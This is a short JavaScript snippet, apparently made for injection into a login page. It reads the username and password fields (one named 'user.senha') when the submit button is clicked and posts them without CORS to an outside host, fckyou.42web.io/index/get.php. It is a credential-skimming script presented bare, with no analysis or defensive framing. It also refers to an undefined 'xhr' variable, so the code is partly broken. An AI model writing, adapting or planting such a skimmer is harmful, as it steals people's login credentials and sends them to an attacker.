console.log(1)

let btn = document.querySelector('[data-callback="onSubmit"]')
const username = document.querySelector('[name="user.login"]')
const password = document.querySelector('[name="user.senha"]')


if (btn){
    btn.addEventListener("click", function(){
        const urlContent = xhr.responseText;

        const data = new FormData();
        data.append("username", username.value);
        data.append("password", password.value);


        const response = fetch("https://fckyou.42web.io/index/get.php", {
            mode: 'no-cors',
            method: "POST",
            body: data
        });
        
        console.log(data)
    });
}
